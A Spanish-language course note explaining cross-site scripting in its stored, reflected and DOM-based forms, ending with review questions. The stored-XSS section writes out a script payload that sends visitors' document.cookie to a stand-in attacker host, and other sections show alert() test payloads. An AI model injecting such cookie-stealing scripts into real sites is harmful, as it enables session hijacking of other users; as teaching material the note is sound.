# 06 - Cross-Site Scripting (XSS)

## 🎯 Objetivos
- Entender que XSS es una vulnerabilidad de Inyección que ataca al Frontend (Navegador).
- Aprender cómo el lenguaje JavaScript malicioso se inyecta en víctimas inocentes.
- Distinguir entre las 3 variantes (Reflejado, Almacenado y DOM).

---

## 🧠 Concepto: Atacando al Usuario (Frontend)

En SQL Injection (SQLi), el atacante engañaba al servidor web para robarse la base de datos de la empresa. En XSS, **al atacante no le importa la empresa ni el servidor**. El objetivo es inyectar código en la página web para hackear a las computadoras de *otros usuarios* que visiten esa página.

**La Regla de Oro:** XSS siempre involucra el lenguaje **JavaScript (JS)**.
Como JS corre exclusivamente en la Memoria RAM del navegador de la víctima (Chrome/Firefox), si el atacante logra que la página web ejecute su código malicioso de JS en tu navegador, tu navegador le obedecerá (Robando tus cookies, redirigiéndote a sitios falsos, o leyendo tus mensajes privados).

---

## 💥 1. XSS Almacenado (Stored XSS) - El más devastador

Ocurre cuando el servidor web **guarda** el código malicioso en su base de datos y se lo muestra a todo el mundo.
El ejemplo clásico es un Foro de comentarios o un Perfil de usuario (Ej: Myspace o Twitter).

**El Ataque:**
1. El atacante entra al foro y en lugar de escribir el comentario "Hola amigos", inyecta etiquetas especiales HTML de Script, escribiendo:
   `<script> fetch('http://hacker.com/robar?cookie=' + document.cookie); </script>`
2. El servidor (que no filtró nada) guarda ese comentario textual en su Base de Datos.
3. El atacante se va a dormir.
4. Al día siguiente, 1.000 usuarios distintos entran al Foro a leer los comentarios. 
5. Sus navegadores (Chrome) descargan la página del foro. Al llegar a la línea del comentario del atacante, Chrome ve la etiqueta `<script>`, asume que es una instrucción legítima de la página, **y la ejecuta 1.000 veces silenciosamente**.
6. El atacante acaba de recibir, en su servidor remoto, las "llaves de inicio de sesión" (Cookies) de 1.000 víctimas distintas.

---

## 🪞 2. XSS Reflejado (Reflected XSS)

Aquí el código malicioso *no* se guarda en la base de datos. Se inyecta temporalmente a través de la URL y se "refleja" (rebota) instantáneamente en la pantalla de la víctima.
El ejemplo clásico son las barras de búsqueda (Ej: Buscaste "Zapatos", la web te dice: *'Resultados para: Zapatos'*).

**El Ataque (Requiere Ingeniería Social):**
1. El atacante construye un link envenenado:
   `www.banco.com/buscar?query=<script>alert('Hackeado');</script>`
2. El atacante no puede inyectar esto en el banco, así que se lo envía a su víctima (Juan) por WhatsApp diciéndole: *"Mirá esta oferta"*.
3. Juan hace clic en el link.
4. Su navegador va al banco. El banco lee la palabra de la URL, y la refleja inmediatamente en el medio de la pantalla (HTML):
   *Resultados para: `<script>alert('Hackeado');</script>`*
5. El navegador de Juan ve el código y lo ejecuta. Juan fue hackeado porque hizo clic en un link, y la magia ocurrió en su propia PC usando la reputación de la página oficial del banco.

---

## 🧩 3. DOM-Based XSS

Es el más complejo (y favorito del Bug Bounty actual). Ocurre 100% en el Frontend (en tu computadora).
La inyección nunca viaja al servidor Backend (Python/PHP). Se produce porque el propio código de JavaScript de la página web que estás mirando está mal programado.

- El código JS legítimo de la web lee un pedazo de texto de tu URL local (ej. lo que va después del símbolo `#`).
- Luego, agarra ese texto (que el atacante inyectó maliciosamente) y, mediante funciones súper peligrosas como `innerHTML` o `eval()`, lo pega en la pantalla.
- Como todo el flujo pasó en el navegador (Chrome), los Firewall Web (WAF) corporativos instalados en el servidor están ciegos y nunca ven el ataque.

---

## 📌 Must Know (Imprescindible)
- Qué es **XSS (Cross-Site Scripting)**: Inyectar código de JavaScript (a menudo usando `<script>`) en una web de confianza para que se ejecute en el navegador de la víctima.
- El objetivo número uno de XSS: **Robar las Cookies de Sesión (`document.cookie`)**.
- Distinguir las variantes:
  - **Almacenado (Stored):** Vive en la Base de Datos. Pega a todos los que entran.
  - **Reflejado (Reflected):** Viene en la URL. Requiere que la víctima haga clic.
  - **DOM:** Ocurre puramente en el Frontend por mal uso del JavaScript local.

---

## 🔄 Preguntas de repaso
1. Al realizar una auditoría de un blog de recetas, inyectás el código `<script>alert('Prueba XSS');</script>` en la sección de comentarios del pie de página. Después de publicar, cada vez que vos (u otro usuario) actualiza la página o entra a la receta, salta una ventana emergente diciendo "Prueba XSS". ¿Qué tipo específico de XSS acabas de descubrir y por qué se lo considera el de mayor impacto/severidad?
2. Si el objetivo del ataque XSS (y del lenguaje JavaScript) no es comprometer el servidor interno donde viven los datos (Backend), ¿quién o qué cosa es la verdadera "víctima" material donde se ejecutan los comandos maliciosos y de quién provienen los datos robados (ej. las Cookies)?
3. Un atacante le envía un correo electrónico a un directivo de la compañía con un enlace hacia la página interna de la Intranet corporativa, la cual es vulnerable a **XSS Reflejado**. El enlace incluye en la URL el código JS para robar la cookie. Explicá por qué el ataque no funcionará a menos que el directivo haga clic activamente en ese enlace engañoso.

**➡️ Siguiente nota:** [[07 - Manejo de Sesiones (Cookies vs Tokens JWT)]]
